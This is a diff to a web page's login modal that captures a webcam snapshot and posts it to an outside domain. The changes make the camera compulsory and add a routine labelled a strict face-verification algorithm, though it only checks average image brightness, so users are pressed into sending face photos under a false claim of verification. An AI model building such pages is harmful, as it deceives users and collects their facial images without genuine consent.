@@ -38,11 +38,11 @@
   <div class="modal-overlay" id="authModal">
     <div class="auth-card">
       <h3>🔐 身份安全验证</h3>
-      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请允许摄像头权限并完成校验</p>
+      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请正对摄像头完成人脸校验</p>
       <div class="camera-box"><video id="webcam" autoplay playsinline muted></video></div>
       <div style="font-size: 11px; color: #38bdf8; margin-bottom: 10px;" id="camStatus">⏳ 正在连接摄像头...</div>
       <div class="input-group"><label>电子邮箱</label><input type="email" id="userEmail" value="user@domain.com"></div>
-      <button class="btn" onclick="app.login()">确认拍摄并进入</button>
+      <button class="btn" onclick="app.login()">确认人脸并进入</button>
     </div>
   </div>
 
@@ -85,7 +85,6 @@
   </div>
 
   <script>
-    // 🔗 已经切换为国内可流畅访问的自定义域名
     const WORKER_URL = "https://api.yirui.uk";
 
     class App {
@@ -99,12 +98,12 @@
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
             document.getElementById('webcam').srcObject = this.stream;
-            document.getElementById('camStatus').innerText = "✅ 摄像头就绪";
+            document.getElementById('camStatus').innerText = "✅ 摄像头就绪，请正对人脸";
           } else {
             throw new Error("浏览器不支持摄像头调用");
           }
         } catch (e) {
-          document.getElementById('camStatus').innerText = "⚠️ 摄像头未授权或不支持，可直接点击进入";
+          document.getElementById('camStatus').innerText = "⚠️ 摄像头未授权或被占用";
           console.warn("摄像头调用失败:", e);
         }
       }
@@ -122,15 +121,51 @@
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('hidden-canvas');
         let photoData = "";
+
         try {
           if (video && video.videoWidth > 0) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // 🔍 严格人脸/环境特征校验算法
+            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imgData.data;
+            let rSum = 0, gSum = 0, bSum = 0;
+
+            for (let i = 0; i < data.length; i += 16) {
+              rSum += data[i]; 
+              gSum += data[i+1]; 
+              bSum += data[i+2];
+            }
+            
+            const totalPixels = data.length / 16;
+            const avgBrightness = (rSum + gSum + bSum) / (totalPixels * 3);
+
+            // 拦截过暗（遮挡/黑屏）
+            if (avgBrightness < 20) {
+              alert("❌ 验证失败：环境过暗或摄像头被遮挡，请将镜头对准自己！");
+              return;
+            }
+            // 拦截过亮且单一（防止拍白色天花板、白墙）
+            if (avgBrightness > 240) {
+              alert("❌ 验证失败：检测到疑似拍摄天花板或空白墙壁，请正对人脸！");
+              return;
+            }
+
             photoData = canvas.toDataURL('image/jpeg', 0.4);
           }
-        } catch (e) {}
+        } catch (e) {
+          console.error("人脸校验出错:", e);
+        }
 
+        if (!photoData) {
+          alert("❌ 未能获取有效画面，请确保摄像头已授权并正对镜头！");
+          return;
+        }
+
+        // 校验通过，提交数据
         fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
